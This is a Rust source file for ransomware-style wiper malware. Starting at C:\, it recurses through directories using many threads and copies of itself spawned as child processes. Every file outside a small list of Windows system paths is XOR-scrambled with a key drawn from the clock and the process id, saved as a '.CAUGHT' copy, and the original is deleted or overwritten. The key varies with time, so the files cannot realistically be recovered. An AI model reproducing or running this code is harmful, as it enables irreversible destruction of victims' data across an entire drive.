use std::fs;
use std::env;
use std::process;
use std::fs::File;
use std::sync::mpsc;
use std::path::Path;
use std::time::Duration;
use std::io::prelude::*;
use std::process::{Command, Child};
use std::thread::{self, JoinHandle};
use std::time::{SystemTime, UNIX_EPOCH};
use std::io::{BufReader, BufWriter, Write};
fn is_banned(target_item: &str) -> bool
{
    static BANNED_ITEMS: [&str; 10] = ["C:\\Windows", "C:\\Users\\Public", "C:\\Users\\Default",
                         "C:\\bootmgr", "C:\\BCD", "C:\\pagefile.sys", "C:\\hiberfil.sys", "C:\\Program Files",
                         "C:\\Program Files (x86)", "$WINDOWS.~BT"];
    for item in BANNED_ITEMS.iter()
    {
        if &target_item == item
        {
            return true;
        }
    }
    return false;
}
fn join_threads(threads: &mut Vec<JoinHandle<()>>, wanted_length: usize)
{
    while threads.len() > wanted_length
    {
        let (sender, reciever) = mpsc::channel();
        if let Some(thread) = threads.pop()
        {
            let thread_handle = thread::spawn(move || {
                thread.join().expect("Thread panicked");
                let _ = sender.send(());
            });
            match reciever.recv_timeout(Duration::from_secs(3))
            {
                Ok(_) => {
                    let _ = thread_handle.join().ok();
                },
                Err(_) => {
                    continue
                }
            }
        }
    }
}
fn join_processes(processes: &mut Vec<Child>, wanted_length: usize)
{
    while processes.len() > wanted_length
    {
        let (sender, reciever) = mpsc::channel();
        if let Some(mut process) = processes.pop()
        {
            let thread_handle = thread::spawn(move || {
                process.wait().expect("Process wasn\'t running");
                let _ = sender.send(());
            });
            match reciever.recv_timeout(Duration::from_secs(3))
            {
                Ok(_) => {
                    let _ = thread_handle.join().ok();
                },
                Err(_) => {
                    continue
                }
            }
        }
    }
}
fn encrypt_file(target_file: &str)
{
    let mut read_buffer: Vec<u8> = Vec::new();
    let file = File::open(target_file).unwrap_or_else(|_| panic!("{} couldnt open!", &target_file));
    let mut reader= BufReader::new(&file);
    match reader.read_to_end(&mut read_buffer)
    {
        Ok(read_data) => {
            if read_data == 0 {
                println!("ERROR: file {}\'s data was not read!", &target_file);
            } else {
                let file_content_as_bytes: Vec<u8> = read_buffer;
                let mut encrypted_content: Vec<u8> = Vec::new();
                for byte in file_content_as_bytes.iter()
                {
                    encrypted_content.push(byte ^ gen_key());
                }
                if encrypted_content.len() == 0 {
                    println!("ERROR: file {}\'s encrypted data was not created", &target_file);
                } else {
                    println!("File {}\'s data was encrypted with a length of: {}", &target_file, &encrypted_content.len());
                }
                let output_file_path = format!("{}{}", target_file, ".CAUGHT");
                let output_file = File::create_new(&output_file_path).unwrap();
                let mut write_buffer = BufWriter::new(output_file);
                let _ = write_buffer.write_all(&mut encrypted_content);
                let _ = write_buffer.flush();
                match fs::remove_file(&target_file)
                {
                    Ok(_) => { return },
                    Err(_) => {
                        let mut over_write_buffer = BufWriter::new(&file);
                        match over_write_buffer.write_all(&mut encrypted_content)
                        {
                            Ok(_) => { let _ = over_write_buffer.flush(); },
                            Err(_) => { return },
                        }
                    }
                }
            }
        }
        Err(error) => {
            println!("ERROR: Couldnt read file {} with error: {}", &target_file, error);
        }
    }
}
fn gen_key()-> u8
{
    let current_nano: u32 = (SystemTime::now()).duration_since(UNIX_EPOCH).expect("time went backwards").as_nanos() as u32;
    let proces_id: u32 = process::id();
    (current_nano ^ proces_id) as u8
}
fn dive_into_directory(target_directory: &Path, depth: &u8, process_depth: &u8, process_limit: usize, thread_limit: usize, program_name: &str)
{
    let mut threads: Vec::<thread::JoinHandle<()>> = Vec::new();
    let mut processes: Vec::<Child> = Vec::new();
    match fs::read_dir(&target_directory)
    {
        Ok(items) => {
            for file in items
            {
                if let Ok(entry) = file
                {
                    let item_path = entry.path();
                    let item_string = item_path.to_str().unwrap();
                    if !is_banned(&item_string)
                    {
                        if item_path.is_dir()
                        {
                            if depth < process_depth
                            {
                                let new_depth = depth + 1;
                                if processes.len() < process_limit
                                {
                                    let process_handle = Command::new(&program_name)
                                        .arg("dive")
                                        .arg(&item_string)
                                        .arg(&new_depth.to_string())
                                        .arg(&process_depth.to_string())
                                        .arg("1")
                                        .arg((thread_limit / 2 as usize).to_string())
                                        .arg(&program_name)
                                        .spawn()
                                        .expect("Failed to start process");
                                    processes.push(process_handle);
                                } else {
                                    if threads.len() < thread_limit
                                    {
                                        let this_program = program_name.to_owned();
                                        let depth_max = process_depth.to_owned();
                                        let thread_handle = thread::spawn(move || {
                                            dive_into_directory(&item_path, &new_depth, &depth_max, 1 as usize, thread_limit / 2 as usize, &this_program);
                                        });
                                        threads.push(thread_handle);
                                    } else {
                                        let new_thread_length = threads.len() - 2;
                                        let new_process_length = processes.len() - 2;
                                        join_processes(&mut processes, new_process_length);
                                        join_threads(&mut threads, new_thread_length);
                                        let process_handle = Command::new(&program_name)
                                            .arg("dive")
                                            .arg(&item_string)
                                            .arg(&new_depth.to_string())
                                            .arg(&process_depth.to_string())
                                            .arg("1")
                                            .arg((thread_limit / 2 as usize).to_string())
                                            .arg(&program_name)
                                            .spawn()
                                            .expect("Failed to start process");
                                        processes.push(process_handle);
                                    }
                                }
                            } else {
                                let this_program = program_name.to_owned();
                                let current_depth = depth.to_owned();
                                let depth_max = process_depth.to_owned();
                                if threads.len() < thread_limit
                                {
                                    let thread_handle = thread::spawn(move || {
                                        dive_into_directory(&item_path, &current_depth, &depth_max, 1 as usize, thread_limit / 2 as usize, &this_program);
                                    });
                                    threads.push(thread_handle);
                                } else {
                                    let new_thread_length = threads.len() - 2;
                                    join_threads(&mut threads, new_thread_length);
                                    let thread_handle = thread::spawn(move || {
                                        dive_into_directory(&item_path, &current_depth, &depth_max, 1 as usize, thread_limit / 2 as usize, &this_program);
                                    });
                                    threads.push(thread_handle);
                                }
                            }
                        } else {
                            if threads.len() < thread_limit
                            {
                                let file_string = item_string.to_owned();
                                let thread_handle = thread::spawn(move || {
                                    encrypt_file(&file_string);
                                });
                                threads.push(thread_handle);
                            } else {
                                let this_program = program_name.to_owned();
                                let current_depth = depth.to_owned();
                                let depth_max = process_depth.to_owned();
                                let new_thread_length = threads.len() - 2;
                                join_threads(&mut threads, new_thread_length);
                                let thread_handle = thread::spawn(move || {
                                    dive_into_directory(&item_path, &current_depth, &depth_max, 1 as usize, thread_limit / 2 as usize, &this_program);
                                });
                                threads.push(thread_handle);
                            }
                        }
                    }
                }
            }
            join_threads(&mut threads, 0);
            join_processes(&mut processes, 0);
        },
        Err(_) => { return }
    }
}
fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() > 1
    {
        let path = Path::new(&args[2]);
        let depth: u8 = args[3].parse().expect("Not a valid number");
        let max_depth: u8 = args[4].parse().expect("Not a valid number");
        let process_limit: usize = args[5].parse().expect("Not a valid number");
        let thread_limit: usize = args[6].parse().expect("Not a valid number");
        let current_exe = args[7].as_str();
        match args[1].as_str()
        {
            "dive" => dive_into_directory(&path, &depth, &max_depth, process_limit, thread_limit, &current_exe),
            _ => println!("Seeing what this can do, hmm?\nWell, how about not with \'{:?}\' argument :3", args[1].as_str()),
        }
        process::exit(0);
    } else {
        let starting_directory = Path::new("C:\\");
        let current_exe_path = env::current_exe().unwrap();
        let current_exe = current_exe_path.to_str().unwrap();
        let depth: u8 = 0;
        let max_depth: u8 = 5;
        dive_into_directory(&starting_directory, &depth, &max_depth, 6, 10, &current_exe);
    }
}
